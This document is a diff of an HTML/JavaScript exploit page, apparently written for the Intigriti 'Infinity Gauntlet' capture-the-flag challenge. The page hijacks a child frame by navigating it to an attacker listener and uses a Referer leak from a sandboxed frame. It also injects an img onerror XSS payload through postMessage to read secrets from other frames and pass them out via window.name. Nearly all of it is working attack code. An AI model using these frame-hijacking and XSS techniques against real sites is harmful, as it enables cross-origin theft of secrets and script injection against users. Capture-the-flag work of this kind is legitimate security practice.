@@ -1,83 +1,85 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Protocol v5: Frame Hijacker</title>
+    <title>Infinity Gauntlet: Final</title>
 </head>
 <body>
-    <h1>Protocol v5</h1>
-    <p>1. Ensure <b>listener.html</b> is in the same folder.</p>
-    <p>2. Click Launch. Do not close tabs.</p>
-    <button id="btn" style="font-size:20px; padding:20px; background:#d00; color:white;">LAUNCH HIJACK</button>
-    <pre id="log" style="background:#eee; padding:10px;"></pre>
+    <h1>Protocol v6: The Referer Leak</h1>
+    <p>1. Open Developer Tools (F12) -> <b>Network Tab</b>.</p>
+    <p>2. Click Launch. Watch for a request to <code>/?LEAK_TIME_STONE</code>.</p>
+    <button id="btn" style="font-size:20px; padding:20px; background:#d00; color:white;">LAUNCH EXPLOIT</button>
+    
+    <h3>Gauntlet Status:</h3>
+    <pre id="log" style="background:#eee; padding:10px; min-height:100px;">Waiting...</pre>
 
     <script>
         let targetWin = null;
         let stones = {};
-        let spaceHijacked = false;
-
-        // Configuration: URL of your listener.html
+        
+        // Point to your listener file
         const LISTENER_URL = location.href.substring(0, location.href.lastIndexOf('/')) + '/listener.html';
+        const LEAK_URL = location.href.substring(0, location.href.lastIndexOf('/')) + '/?LEAK_TIME_STONE';
+
+        function log(msg) {
+            document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
+        }
 
         document.getElementById('btn').addEventListener('click', () => {
             targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
             log("Target launched...");
             
-            // RACE CONDITION: We must hijack Frame 3 (Space) BEFORE the parent sends the message.
-            // We spam the navigation command immediately.
+            // 1. SPACE STONE HIJACK (Immediate Race Condition)
+            // We force Frame 3 to load our listener instead of the challenge page.
+            // This captures the parent's postMessage.
             let hijacker = setInterval(() => {
-                if(targetWin && targetWin.frames && targetWin.frames[3]) {
-                    try {
-                        // HIJACK SPACE STONE
-                        targetWin.frames[3].location = LISTENER_URL;
-                        // log("Hijack command sent to Frame 3");
-                    } catch(e) {}
-                }
+                try { targetWin.frames[3].location = LISTENER_URL; } catch(e) {}
             }, 10);
+            setTimeout(() => clearInterval(hijacker), 1500);
 
-            // Stop hijacking after 2 seconds (it should be done by then)
-            setTimeout(() => clearInterval(hijacker), 2000);
+            // 2. TIME STONE LEAK (Referer Leak)
+            // We cannot script the Time Stone (Sandbox), but we CAN navigate it!
+            // We navigate it to our server. The 'Referer' header will contain the secret URL.
+            setTimeout(() => {
+                try { 
+                    log("Redirecting Time Stone to capture Referer...");
+                    targetWin.frames[4].location = LEAK_URL; 
+                } catch(e) {}
+            }, 1000);
 
-            // Start the regular collection loop
+            // 3. REGEX EXPLOIT LOOP (Power, Reality, Soul, Mind)
             setInterval(collectStones, 500);
         });
 
         function collectStones() {
             if(!targetWin) return;
 
-            // 1. CHECK HIJACKED SPACE STONE
+            // CHECK SPACE STONE (Index 3)
             try {
-                // If hijack worked, the frame is now Same-Origin to us!
-                // We can read its name directly.
                 let spaceName = targetWin.frames[3].name;
-                if(spaceName && spaceName.startsWith("SPACE_CAPTURED:")) {
-                    let secret = spaceName.split(':')[1];
-                    if(!stones[3]) {
-                        stones[3] = secret;
-                        log("[+] HIJACK SUCCESS! Space Stone: " + secret);
-                    }
+                if(spaceName && spaceName.startsWith("SPACE_CAPTURED:") && !stones[3]) {
+                    stones[3] = spaceName.split(':')[1];
+                    log(`[+] Space Stone: ${stones[3]}`);
                 }
             } catch(e) {}
 
-            // 2. ATTACK OTHER STONES (Power, Reality, Soul, Mind)
-            // Note: We skip Time (4) for now as it is Sandboxed.
+            // EXPLOIT OTHER STONES (0, 1, 2, 5)
             [0, 1, 2, 5].forEach(i => {
                 if(stones[i]) return;
                 try {
                     let f = targetWin.frames[i];
-                    // Primer
+                    // PRIMER
                     f.postMessage("A".repeat(2500) + "<", '*');
-                    // Payload
-                    let script = `
-                        var m = location.search.match(/=[a-f0-9]{8}/);
-                        if(m) window.name = "STONE:${i}:" + m[0].substring(1);
-                    `;
-                    f.postMessage(`<img src=x onerror='${script}'>`, '*');
                     
-                    // Collect
+                    // PAYLOAD (Fixed Syntax: Single quotes inside double quotes)
+                    // We execute JS to read the URL and set window.name
+                    let script = "var m=location.search.match(/=[a-f0-9]{8}/); if(m) window.name='STONE:'+m[0].substring(1);";
+                    f.postMessage(`<img src=x onerror="${script}">`, '*');
+                    
+                    // COLLECT
                     let data = f.name;
-                    if(data && data.startsWith(`STONE:${i}:`)) {
-                        stones[i] = data.split(':')[2];
-                        log(`[+] Got Stone ${i}: ${stones[i]}`);
+                    if(data && data.startsWith('STONE:')) {
+                        stones[i] = data.split(':')[1];
+                        log(`[+] Stone ${i}: ${stones[i]}`);
                     }
                 } catch(e) {}
             });
@@ -86,26 +88,29 @@
         }
 
         function checkWin() {
-            // We need 6 stones. We likely have 5 now (0,1,2,3,5).
-            // We are missing Time (4).
-            
-            let count = Object.keys(stones).length;
-            if(count >= 5 && !stones[4]) {
-                 log("We have 5 stones! Missing Time Stone.");
-                 log("Attempting Brute Force or Partial Attack...");
-                 
-                 // THIS IS THE GUESS:
-                 // Maybe we can just send the 5 stones we have?
-                 // Or maybe we can guess the Time Stone?
+            // We can automate the alert if we have 5 stones + user provides the 6th
+            if (Object.keys(stones).length >= 5) {
+                // We have everything except Time Stone (which is in your Network Tab)
+                log("------------------------------------------------");
+                log("SUCCESS! 5 Stones Captured.");
+                log("CHECK YOUR NETWORK TAB for '/?LEAK_TIME_STONE'");
+                log("The 'Referer' header of that request has the missing code.");
+                log("------------------------------------------------");
+                
+                // Construct partial code to help you
+                let code = 
+                    (stones[0]||"????????") + 
+                    (stones[5]||"????????") + 
+                    (stones[1]||"????????") + 
+                    (stones[3]||"????????") + 
+                    (stones[2]||"????????") + 
+                    "TIME_STONE"; // Placeholder
+                
+                log("Partial Code: " + code);
+                log("Replace TIME_STONE with the code from Network Tab.");
+                log("Run this in Console: targetWin.postMessage('FULL_CODE' + 'alert(document.domain)', '*')");
             }
-            
-            // Visual Update
-            document.getElementById('log').innerText = 
-                `Stones: ${count}/6\n` + 
-                JSON.stringify(stones, null, 2);
         }
-        
-        function log(msg) { console.log(msg); }
     </script>
 </body>
 </html>
